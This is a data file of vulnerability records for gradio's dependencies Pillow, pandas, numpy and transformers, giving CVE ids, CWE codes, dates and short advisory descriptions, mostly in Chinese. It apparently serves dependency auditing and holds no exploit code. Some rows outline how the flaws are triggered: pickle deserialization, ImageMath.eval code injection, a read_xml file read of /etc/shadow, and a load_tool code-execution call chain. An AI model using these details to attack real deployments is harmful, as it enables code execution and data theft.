gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
